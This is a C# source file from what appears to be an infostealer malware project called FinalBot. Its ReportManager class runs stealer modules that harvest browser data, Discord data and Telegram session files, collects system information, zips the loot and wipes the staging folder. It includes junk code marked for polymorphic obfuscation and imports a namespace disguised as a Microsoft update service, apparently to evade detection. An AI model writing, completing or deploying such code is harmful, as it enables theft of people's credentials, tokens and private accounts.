using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using Microsoft.UpdateService.Modules; 
using FinalBot.Modules;
using FinalBot.Stealers;

namespace FinalBot
{
    public static class ReportManager
    {
        // [POLY_JUNK]
        private static void _vanguard_906a5958() {
            int val = 26537;
            if (val > 50000) Console.WriteLine("Hash:" + 26537);
        }

        public static async Task<string?> CreateFullReport()
        {
            string tempDir = Path.Combine(Path.GetTempPath(), $"Report_{DateTime.Now:yyyyMMdd_HHmmss}");
            try 
            {
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

                // 1. Run Stealers
                // Browsers
                try {
                    var browserService = new DataService();
                    var result = await browserService.RunCompleteSteal();
                    File.WriteAllText(Path.Combine(tempDir, "Browsers.txt"), result.Message);
                } catch { }

                // Discord
                try {
                    var discordService = new ChatService();
                    string discordReport = await discordService.Run();
                    File.WriteAllText(Path.Combine(tempDir, "Discord.txt"), discordReport);
                } catch { }

                // Telegram
                try {
                    var telegramService = new MessengerService();
                    string tgResult = telegramService.Run();
                    if (!string.IsNullOrEmpty(tgResult) && !tgResult.StartsWith("❌") && Directory.Exists(tgResult))
                    {
                        string destDir = Path.Combine(tempDir, "Telegram");
                        Directory.CreateDirectory(destDir);
                        foreach (var file in Directory.GetFiles(tgResult))
                        {
                            File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
                        }
                    }
                    else
                    {
                        File.WriteAllText(Path.Combine(tempDir, "Telegram_Status.txt"), tgResult);
                    }
                } catch { }

                // 2. System Info
                try {
                    string sysInfo = SystemInfoModule.GetSystemInfo();
                    File.WriteAllText(Path.Combine(tempDir, "System_Info.txt"), sysInfo);
                } catch { }

                // 3. ZIP everything
                string zipPath = tempDir + ".zip";
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);

                // 4. Cleanup temp dir
                CleanupService.WipeDirectory(tempDir);

                return zipPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[REPORT ERROR] {ex.Message}");
                return null;
            }
        }
    }
}
